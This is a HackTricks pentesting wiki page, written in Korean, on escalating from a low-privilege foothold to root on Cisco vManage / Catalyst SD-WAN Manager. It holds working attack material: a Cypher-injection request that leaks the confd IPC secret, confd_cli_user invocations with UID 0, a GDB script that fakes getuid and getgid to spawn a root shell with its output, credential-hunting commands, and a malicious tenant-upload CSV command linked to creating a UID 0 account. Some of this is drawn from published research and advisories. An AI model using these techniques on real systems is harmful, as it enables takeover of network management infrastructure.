# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager*에서 `vmanage`, `netadmin` 또는 `vmanage-admin`으로 code execution을 확보했다면, 가장 흥미로운 로컬 privesc 공격 표면은 일반적으로 `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs 및 root 소유의 import/upload handler입니다.

컨트롤러에서 여전히 **initial foothold**가 필요하다면, 먼저 전용 control-plane 페이지를 확인하세요.

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## 빠른 로컬 triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
`/etc/confd/confd_ipc_secret`을 foothold에서 읽을 수 있다면 Path 1과 Path 2를 즉시 실제로 사용할 수 있습니다. remote info leak 또는 webshell을 통해 진입했다면, 이미 `vmanage-admin` SSH material 또는 multitenancy upload handlers에 접근할 수 있는지도 확인하세요. 2026년 연구에서는 두 가지 모두 현실적인 stepping stone인 것으로 나타났습니다.

## Path 1

([https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)의 예시)

`confd` 및 여러 바이너리와 관련된 일부 [documentation](http://66.218.245.39/doc/html/rn03re18.html)을 조금 조사한 후(Cisco website의 계정으로 접근 가능), IPC socket을 authenticate할 때 `/etc/confd/confd_ipc_secret`에 있는 secret을 사용한다는 사실을 확인했습니다:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Neo4j 인스턴스를 기억하는가? 이는 `vmanage` 사용자의 권한으로 실행되고 있으므로, 이전 취약점을 사용해 파일을 가져올 수 있다:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 프로그램은 명령줄 인자를 지원하지 않지만, 인자를 사용해 `/usr/bin/confd_cli_user`를 호출합니다. 따라서 `/usr/bin/confd_cli_user`를 직접 호출하고 원하는 인자 집합을 전달할 수 있습니다. 그러나 현재 권한으로는 해당 파일을 읽을 수 없으므로, rootfs에서 파일을 가져와 scp로 복사한 다음 도움말을 확인하고 이를 사용해 shell을 획득해야 합니다:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## 경로 2

([https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)의 예시)

synacktiv 팀의 블로그¹에서는 root shell을 얻는 우아한 방법을 설명했지만, `/usr/bin/confd_cli_user`의 복사본을 확보해야 한다는 단점이 있습니다. 이 파일은 root만 읽을 수 있습니다. 저는 이러한 번거로움 없이 root로 권한을 상승시킬 수 있는 다른 방법을 찾았습니다.

`/usr/bin/confd_cli` binary를 disassemble했을 때 다음과 같은 내용을 확인했습니다.

<details>
<summary>UID/GID 수집을 보여주는 Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

“ps aux”를 실행했을 때 다음을 확인했다 (_참고 -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
“confd_cli” 프로그램이 로그인한 사용자로부터 수집한 사용자 ID와 그룹 ID를 “cmdptywrapper” 애플리케이션에 전달한다고 가정했다.

첫 번째 시도로 “cmdptywrapper”를 직접 실행하면서 `-g 0 -u 0`을 전달했지만 실패했다. 실행 과정 어딘가에서 파일 디스크립터(-i 1015)가 생성되는 것으로 보이며, 이를 위조할 수 없었다.

synacktiv의 blog(마지막 예제)에서 언급했듯이, `confd_cli` 프로그램은 command line argument를 지원하지 않지만 debugger를 사용해 이를 조작할 수 있으며, 다행히 시스템에 GDB가 포함되어 있다.

`getuid` 및 `getgid` API가 0을 반환하도록 강제하는 GDB script를 작성했다. Deserialization RCE를 통해 이미 “vmanage” privilege를 보유하고 있으므로 `/etc/confd/confd_ipc_secret`을 직접 읽을 permission이 있다.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
콘솔 출력:

<details>
<summary>콘솔 출력</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco는 이후 [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)에 대한 자체 advisory에서 더 깔끔한 로컬 root 경로를 문서화했습니다. **읽기 전용 권한만 가진 인증된 공격자**가 crafted request를 manager CLI에 전송하면, 불충분한 input validation으로 인해 root 권한을 획득할 수 있었습니다.

Offensive 관점에서 중요한 takeaway는 다음과 같습니다.

1. 시스템에서 *어떤 형태로든* 낮은 권한 foothold를 확보했다면, 더 복잡한 Path 1 / Path 2 workflow를 시도하기 전에 로컬 CLI service를 테스트해야 합니다.
2. Path 2의 artifacts를 재사용하여 trust boundary를 확인합니다: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend로 전달되는 모든 field를 의심해야 합니다: UID/GID, username, terminal metadata, imported files 또는 이후 root-owned helper가 사용하는 모든 값.
4. 낮은 권한 사용자가 로컬 CLI socket에 접근하고 이러한 field에 영향을 줄 수 있다면, root 권한은 crafted request 하나만으로 획득할 수 있습니다.

appliance에 진입한 후의 practical workflow는 다음과 같습니다:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
이는 2025년 버그를 유사한 버전에서 활용할 수 있는 좋은 hunting pattern으로 바꿔 줍니다. **userland에서 identity를 수집한 후 더 높은 권한의 wrapper로 전달하는 local CLI shim**을 찾아보세요.

**CVE-2025-20122**를 이후에 나온 **CVE-2026-20122**와 혼동하지 마세요. 2025년 이슈는 *local* CLI-to-root 버그인 반면, 2026년 이슈는 주로 foothold를 심은 다음 Path 1 / Path 2 / Path 4를 다시 검토하는 데 유용한 *remote* API arbitrary file overwrite입니다.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco의 2026년 2월 advisory에서는 또 다른 유용한 privesc class도 소개했습니다. [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)은 REST API의 불충분한 user-authentication mechanism 때문에 **authenticated 상태의 local low-privilege attacker**가 root 권한을 획득할 수 있도록 했습니다.

이는 vManage privesc가 더 이상 `confd`/TTY abuse에만 국한되지 않음을 의미합니다. low-priv shell을 획득한 후에는 다음 항목도 hunting하세요.

- caller를 지나치게 신뢰하는 localhost-only API endpoint
- 현재 account에서 읽을 수 있는 token, cookie 또는 service credential
- 여전히 local에서 trigger할 수 있는 `dataservice`/REST handler에 노출된 root-only action

실제로 `vmanage` 또는 다른 service user로 shell을 획득한 경우, local API abuse는 interactive CLI abuse보다 더 조용하고 자동화하기 쉬운 경우가 많습니다.
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
로컬 세션 컨텍스트만으로 권한이 필요한 REST 기능을 호출할 수 있다면 API 경로를 우선하세요. 재생, 스크립트화, 탈취한 웹 세션 또는 API 토큰과의 연계가 더 쉽습니다.

## 경로 5 (2026년 root가 처리한 crafted file - CVE-2026-20245)

또 다른 최근 패턴은 [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)입니다. `netadmin` 권한을 가진 로컬 공격자가 **crafted file**을 업로드하면 CLI가 이후 이를 안전하지 않게 처리하여 `root` 권한으로 command injection이 발생할 수 있었습니다.

HackTricks 관점에서 중요한 technique은 특정 CVE보다 더 광범위합니다.

1. 파일을 허용하는 모든 CLI 또는 웹 workflow를 열거합니다. 예: import, diagnostic bundle, template, validator, backup, tenant data 등
2. 업로드된 파일이 저장되는 위치와 이를 사용하는 root 소유 script 또는 binary를 추적합니다.
3. 파일명, 파일 내용 또는 파싱된 metadata가 shell command, wrapper script 또는 `system()` 스타일 helper에 전달되는지 테스트합니다.
4. 이미 `netadmin`에 접근할 수 있다면(valid creds, 탈취한 session 또는 auth-bypass chain), file-processing bug가 root로 가는 가장 빠른 경로인 경우가 많습니다.

이후 Google Cloud / Mandiant는 multitenancy import path를 통해 이 bug class가 실제로 악용된 매우 구체적인 사례를 공개했습니다:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
관찰된 공격에서 조작된 CSV는 결국 `/etc/passwd`와 `/etc/shadow`를 수정하여 임시 UID 0 계정(`troot`)을 생성했습니다. 따라서 `tenant-upload` / `tenant-list` 유형의 importer는 특히 주의해서 살펴볼 필요가 있습니다. 이는 단순한 데이터 수집 기능이 아니라, 잠재적으로 root 소유 parser 프런트엔드이기 때문입니다.

셸 측에서 빠르게 탐색할 때 사용할 수 있는 패턴은 다음과 같습니다:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
이 버그 유형은 `root`가 아닌 `netadmin` 권한을 부여하는 remote foothold와 특히 잘 연계됩니다.

## 함께 연계할 수 있는 최근 vManage/Catalyst SD-WAN Manager 취약점

- **인증되지 않은 info leak (CVE-2026-20133)** – 공개된 연구에 따르면 `confd_ipc_secret` 또는 `vmanage-admin` private key가 노출될 수 있어 특히 가치가 높습니다. 이를 통해 read bug를 Path 1 또는 NETCONF pivot으로 전환할 수 있습니다.
- **인증된 API arbitrary file overwrite (CVE-2026-20122)** – 위의 2025 CLI bug와는 다릅니다. VulnCheck는 이를 사용해 webshell을 업로드했으며, 이후 이 페이지의 local privesc 경로가 즉시 중요해집니다.
- **인증된 UI XSS (CVE-2024-20475)** – web UI에서 admin session을 탈취한 다음 API/CLI actions으로 pivot하여 최종적으로 `vshell` 또는 위의 local privesc 경로 중 하나에 도달할 수 있습니다.
- **원격 auth bypass를 통한 `netadmin` 획득 (CVE-2026-20129)** – 2026 crafted-file privesc에 정확히 필요한 권한 수준이 `netadmin`이므로 Path 5의 매우 강력한 precursor입니다.
- **인증된 arbitrary file write (CVE-2026-20262)** – 이후 web UI upload 경로를 통해 수행된다는 점을 제외하면 CVE-2026-20122와 offensive value가 유사합니다. 이후 root 또는 management-plane web tier가 parsing할 위치에 파일을 작성할 수 있습니다.
- **old CLI privesc를 되살리는 downgrade (CVE-2022-20775)** – 2026년 침해 사례에서 공격자들은 이전의 취약한 SD-WAN build로 rollback하고, old CLI root bug를 악용한 다음 원래 version을 복원할 수 있음이 확인되었습니다.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 전용 SD-WAN control-plane 페이지에 더 자세히 설명되어 있습니다. 이를 통해 `vmanage-admin`의 SSH key를 추가할 수 있으며, 이 페이지를 다시 확인하는 데 필요한 local foothold를 확보할 수 있습니다.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
